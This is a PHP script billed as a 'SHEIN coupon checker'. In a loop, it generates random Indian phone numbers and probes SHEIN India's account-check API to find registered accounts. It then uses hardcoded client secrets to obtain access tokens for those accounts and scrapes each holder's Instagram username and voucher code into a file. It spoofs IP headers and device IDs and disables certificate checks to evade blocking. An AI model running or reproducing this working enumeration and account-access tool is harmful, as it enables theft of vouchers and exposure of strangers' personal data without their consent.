<?php
// File to save valid coupons
$validFile = getenv('USERPROFILE') . '/Desktop/Downloads/shein_valid.txt';

// Advanced HTTP function using stream_socket_client
function httpCall($url, $data = null, $headers = [], $method = "GET") {
    $parsedUrl = parse_url($url);
    $host = $parsedUrl['host'];
    $path = $parsedUrl['path'] ?? '/';
    
    if (isset($parsedUrl['query'])) {
        $path .= '?' . $parsedUrl['query'];
    }
    
    $port = isset($parsedUrl['port']) ? $parsedUrl['port'] : 443;
    $timeout = 10;
    
    // Create SSL context with proper options
    $contextOptions = [
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true,
            'crypto_method' => STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT | STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT | STREAM_CRYPTO_METHOD_TLS_CLIENT,
        ],
        'http' => [
            'timeout' => $timeout,
            'ignore_errors' => true
        ]
    ];
    
    $context = stream_context_create($contextOptions);
    
    // Try to open socket
    $socket = @stream_socket_client(
        "ssl://{$host}:{$port}",
        $errno,
        $errstr,
        $timeout,
        STREAM_CLIENT_CONNECT,
        $context
    );
    
    if (!$socket) {
        // Try with fsockopen as fallback
        return httpCallFallback($url, $data, $headers, $method);
    }
    
    // Add default headers if none provided
    if (empty($headers)) {
        $ip = randIp();
        $headers = [
            "X-Forwarded-For: $ip",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept: */*",
            "Connection: close"
        ];
    } else {
        $headers[] = "Connection: close";
    }
    
    // Prepare request body
    $body = '';
    if ($method === "POST" && $data) {
        $body = $data;
        $headers[] = "Content-Length: " . strlen($body);
    }
    
    // Build request
    $request = "{$method} {$path} HTTP/1.1\r\n";
    $request .= "Host: {$host}\r\n";
    
    foreach ($headers as $header) {
        $request .= $header . "\r\n";
    }
    
    $request .= "\r\n";
    
    if (!empty($body)) {
        $request .= $body;
    }
    
    // Send request
    fwrite($socket, $request);
    
    // Read response
    $response = '';
    $startTime = time();
    
    while (!feof($socket) && (time() - $startTime) < $timeout) {
        $chunk = fread($socket, 8192);
        if ($chunk === false || $chunk === '') {
            break;
        }
        $response .= $chunk;
        
        // Check if we have complete headers
        if (strpos($response, "\r\n\r\n") !== false) {
            // For chunked responses, continue reading
            if (strpos($response, "Transfer-Encoding: chunked") !== false) {
                continue;
            }
            
            // Check Content-Length if available
            if (preg_match('/Content-Length:\s*(\d+)/i', $response, $matches)) {
                $contentLength = (int)$matches[1];
                $bodyStart = strpos($response, "\r\n\r\n") + 4;
                $receivedLength = strlen($response) - $bodyStart;
                
                if ($receivedLength >= $contentLength) {
                    break;
                }
            }
        }
    }
    
    fclose($socket);
    
    // Extract body from response
    $parts = explode("\r\n\r\n", $response, 2);
    
    if (count($parts) > 1) {
        $body = $parts[1];
        
        // Handle chunked encoding
        if (strpos($parts[0], "Transfer-Encoding: chunked") !== false) {
            $body = decodeChunked($body);
        }
        
        return $body;
    }
    
    return $response;
}

// Fallback function using file_get_contents with proxy
function httpCallFallback($url, $data = null, $headers = [], $method = "GET") {
    $options = [
        'http' => [
            'method' => $method,
            'header' => implode("\r\n", $headers),
            'timeout' => 10,
            'ignore_errors' => true
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
            'ciphers' => 'HIGH:!SSLv2:!SSLv3'
        ]
    ];
    
    if ($method === "POST" && $data) {
        $options['http']['content'] = $data;
    }
    
    $context = stream_context_create($options);
    
    // Try multiple times
    for ($i = 0; $i < 3; $i++) {
        $result = @file_get_contents($url, false, $context);
        if ($result !== false) {
            return $result;
        }
        sleep(1);
    }
    
    return "";
}

function decodeChunked($str) {
    $result = '';
    $lines = explode("\r\n", $str);
    
    for ($i = 0; $i < count($lines);) {
        $chunkSize = hexdec(trim($lines[$i++]));
        if ($chunkSize == 0) {
            break;
        }
        $result .= substr($lines[$i], 0, $chunkSize);
        $i++;
    }
    
    return $result;
}

function randIp() { 
    return rand(100,200) . "." . rand(10,250) . "." . rand(10,250) . "." . rand(1,250); 
}

function genDeviceId() { 
    return bin2hex(openssl_random_pseudo_bytes(8));
}

function generateIndianNumber() {
    // Generate numbers starting with 8 or 9 only
    $prefixes = ['8', '9'];
    $prefix = $prefixes[array_rand($prefixes)];
    
    $number = $prefix;
    for ($i = 0; $i < 9; $i++) {
        $number .= rand(0, 9);
    }
    
    return $number;
}

function checkNumber($number, &$triedNumbers) {
    if (in_array($number, $triedNumbers)) {
        return false;
    }
    
    $triedNumbers[] = $number;
    echo "Checking: $number\n";
    
    $ip = randIp(); 
    $adId = genDeviceId();
    
    // Step 1: Get access token with retry mechanism
    $access_token = null;
    $retryCount = 0;
    
    while ($retryCount < 2 && !$access_token) {
        $url = "https://api.sheinindia.in/uaas/jwt/token/client";
        $headers = [
            "Client_type: Android/29",
            "Accept: application/json",
            "Client_version: 1.0.8",
            "User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; SM-G973F Build/QP1A.190711.020)",
            "X-Tenant-Id: SHEIN",
            "Ad_id: $adId",
            "X-Tenant: B2C",
            "Content-Type: application/x-www-form-urlencoded",
            "X-Forwarded-For: $ip",
            "Accept-Encoding: gzip, deflate"
        ];
        
        $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
        $res = httpCall($url, $data, $headers, "POST");
        
        if (!empty($res)) {
            $j = @json_decode($res, true);
            if ($j && isset($j['access_token'])) {
                $access_token = $j['access_token'];
                break;
            }
        }
        
        $retryCount++;
        if ($retryCount < 2) {
            echo "Retrying token...\n";
            sleep(1);
        }
    }
    
    if (!$access_token) {
        echo "✗ Token generation failed\n";
        return false;
    }
    
    echo "✓ Got token\n";
    
    // Step 2: Check if number is registered
    $url = "https://api.sheinindia.in/uaas/accountCheck";
    $headers = [
        "Authorization: Bearer $access_token",
        "Requestid: account_check",
        "X-Tenant: B2C",
        "Accept: application/json",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; SM-G973F Build/QP1A.190711.020)",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $data = "mobileNumber=$number";
    $res = httpCall($url, $data, $headers, "POST");
    
    if (empty($res)) {
        echo "✗ Account check failed\n";
        return false;
    }
    
    $j = @json_decode($res, true);
    
    if (!$j) {
        echo "✗ Invalid response\n";
        return false;
    }
    
    if(isset($j['success']) && $j['success'] === false) {
        echo "✗ Not registered\n";
        return false;
    }
    
    $encryptedId = $j['encryptedId'] ?? '';
    if(empty($encryptedId)) {
        echo "✗ No encrypted ID\n";
        return false;
    }
    
    echo "✓ Account exists\n";
    
    // Step 3: Generate SHEIN token
    $payload = json_encode([
        "client_type" => "Android/29",
        "client_version" => "1.0.8",
        "gender" => "",
        "phone_number" => $number,
        "secret_key" => "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
        "user_id" => $encryptedId,
        "user_name" => ""
    ]);
    
    $headers = [
        "Accept: application/json",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; SM-G973F Build/QP1A.190711.020)",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/json; charset=UTF-8",
        "X-Forwarded-For: $ip"
    ];
    
    $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
    $res = httpCall($url, $payload, $headers, "POST");
    
    if (empty($res)) {
        echo "✗ SHEIN token failed\n";
        return false;
    }
    
    $j = @json_decode($res, true);
    
    if(!$j || empty($j['access_token'])) {
        echo "✗ Invalid SHEIN token response\n";
        return false;
    }
    
    $sheinverse_access_token = $j['access_token'];
    echo "✓ Got SHEIN token\n";
    
    // Step 4: Get user data
    $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
    $headers = [
        "Host: shein-creator-backend-151437891745.asia-south1.run.app",
        "Authorization: Bearer " . $sheinverse_access_token,
        "User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Accept: */*",
        "Origin: https://sheinverse.galleri5.com",
        "X-Requested-With: com.ril.shein",
        "Referer: https://sheinverse.galleri5.com/",
        "Content-Type: application/json",
        "X-Forwarded-For: $ip",
        "Accept-Encoding: gzip, deflate"
    ];
    
    $res = httpCall($url, "", $headers, "GET");
    
    if (empty($res)) {
        echo "✗ User data failed\n";
        return false;
    }
    
    // Try to decode gzipped response
    $decoded = @json_decode($res, true);
    if ($decoded === null) {
        // Try to uncompress if gzipped
        $uncompressed = @gzdecode($res);
        if ($uncompressed !== false) {
            $decoded = @json_decode($uncompressed, true);
        }
    }
    
    if (!$decoded || !isset($decoded['user_data']['instagram_data']['username'])) {
        echo "✗ No valid user data\n";
        return false;
    }
    
    $username = $decoded['user_data']['instagram_data']['username'] ?? 'N/A';
    $voucher = $decoded['user_data']['voucher_data']['voucher_code'] ?? 'N/A';
    $voucher_amount = $decoded['user_data']['voucher_data']['voucher_amount'] ?? 'N/A';
    $expiry_date = $decoded['user_data']['voucher_data']['expiry_date'] ?? '';
    $min_purchase_amount = $decoded['user_data']['voucher_data']['min_purchase_amount'] ?? '';
    
    // Check if voucher is valid
    if ($voucher !== 'N/A' && !empty($voucher) && $voucher !== '') {
        echo "\n" . str_repeat("🎉", 20) . "\n";
        echo "✅ COUPON FOUND! ✅\n";
        echo str_repeat("🎉", 20) . "\n\n";
        echo "📱 Number: $number\n";
        echo "📸 Instagram: $username\n";
        echo "🎫 Voucher Code: $voucher\n";
        echo "💰 Amount: ₹$voucher_amount\n";
        echo "💵 Min Purchase: ₹$min_purchase_amount\n";
        echo "📅 Expiry: $expiry_date\n\n";
        
        // Save to file
        $saveData = "========================================\n";
        $saveData .= "Number: $number\n";
        $saveData .= "Instagram: $username\n";
        $saveData .= "Voucher Code: $voucher\n";
        $saveData .= "Amount: ₹$voucher_amount\n";
        $saveData .= "Min Purchase: ₹$min_purchase_amount\n";
        $saveData .= "Expiry Date: $expiry_date\n";
        $saveData .= "Found At: " . date('Y-m-d H:i:s') . "\n";
        $saveData .= "========================================\n\n";
        
        file_put_contents($GLOBALS['validFile'], $saveData, FILE_APPEND);
        
        // Play sound on Windows
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            echo "\x07\x07\x07"; // Multiple beeps
        }
        
        return true;
    } else {
        echo "✓ No coupon\n";
        return false;
    }
}

// Main execution
function clearScreen() {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        system('cls');
    } else {
        system('clear');
    }
}

clearScreen();
echo "========================================\n";
echo "SHEIN COUPON CHECKER - ADVANCED VERSION\n";
echo "========================================\n\n";
echo "🚀 Auto-generating Indian numbers (8 or 9 starting)\n";
echo "💾 Saving to: $validFile\n";
echo "⏸️  Press Ctrl+C to stop\n\n";

// Create directory
$dir = dirname($validFile);
if (!is_dir($dir)) {
    mkdir($dir, 0777, true);
}

// Test connection first
echo "🔍 Testing API connection... ";
$testUrl = "https://api.sheinindia.in/uaas/jwt/token/client";
$testHeaders = [
    "Client_type: Android/29",
    "Accept: application/json",
    "User-Agent: Dalvik/2.1.0",
    "Content-Type: application/x-www-form-urlencoded"
];

$testRes = httpCall($testUrl, "grantType=client_credentials", $testHeaders, "POST");
if (!empty($testRes)) {
    echo "✅ CONNECTED\n\n";
} else {
    echo "❌ BLOCKED - Trying with different method...\n";
    // Try alternative approach
    $testRes = httpCallFallback($testUrl, "grantType=client_credentials", $testHeaders, "POST");
    if (!empty($testRes)) {
        echo "✅ Connected using fallback method\n\n";
    } else {
        echo "❌ Still blocked. Check your internet/VPN\n";
        echo "Trying to continue anyway...\n\n";
    }
}

$triedNumbers = [];
$foundCount = 0;
$checkedCount = 0;
$batchSize = 3; // Reduced batch size for stability

while (true) {
    // Generate numbers
    $numbers = [];
    for ($i = 0; $i < $batchSize; $i++) {
        $num = generateIndianNumber();
        while (in_array($num, $triedNumbers)) {
            $num = generateIndianNumber();
        }
        $numbers[] = $num;
    }
    
    echo "🔢 Batch: " . implode(" ", $numbers) . "\n";
    echo str_repeat("─", 50) . "\n";
    
    foreach ($numbers as $number) {
        $checkedCount++;
        echo "\n[#$checkedCount] ";
        
        $startTime = microtime(true);
        
        if (checkNumber($number, $triedNumbers)) {
            $foundCount++;
            echo "💾 Saved! (Total: $foundCount)\n";
        }
        
        $timeTaken = round(microtime(true) - $startTime, 2);
        echo "⏱️  Time: {$timeTaken}s\n";
        
        usleep(800000); // 0.8 seconds delay
    }
    
    echo "\n" . str_repeat("═", 50) . "\n";
    echo "📈 STATS: Checked: $checkedCount | Found: $foundCount\n";
    echo str_repeat("═", 50) . "\n\n";
    
    echo "⏳ Next batch in 5 seconds...\n";
    for ($i = 5; $i > 0; $i--) {
        echo "\rStarting in {$i}... ";
        sleep(1);
    }
    
    clearScreen();
    echo "========================================\n";
    echo "SHEIN COUPON CHECKER - ADVANCED VERSION\n";
    echo "========================================\n\n";
    echo "📊 Checked: $checkedCount | ✅ Found: $foundCount\n";
    echo "📁 Saving to: $validFile\n\n";
}
?>
